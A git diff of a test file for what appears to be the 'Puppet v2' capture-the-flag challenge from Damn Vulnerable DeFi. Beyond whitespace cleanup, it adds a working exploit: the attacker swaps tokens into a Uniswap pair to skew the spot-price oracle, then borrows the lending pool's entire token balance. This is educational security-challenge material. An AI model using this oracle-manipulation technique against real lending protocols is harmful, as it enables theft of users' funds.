@@ -16,7 +16,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         await ethers.provider.send("hardhat_setBalance", [
@@ -28,7 +28,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();
@@ -38,7 +38,7 @@ describe('[Challenge] Puppet v2', function () {
         this.uniswapRouter = await UniswapRouterFactory.deploy(
             this.uniswapFactory.address,
             this.weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await this.token.approve(
@@ -82,6 +82,25 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.weth.connect(attacker).deposit({ "value": ethers.utils.parseEther("19.95") })
+
+        await this.weth.connect(attacker).approve(
+            this.lendingPool.address,
+            ethers.utils.parseEther('30')
+        );
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ethers.utils.parseEther('10000')
+        );
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ethers.utils.parseEther('10000'),
+            ethers.utils.parseEther('9.9'),
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther('1000000'))
     });
 
     after(async function () {
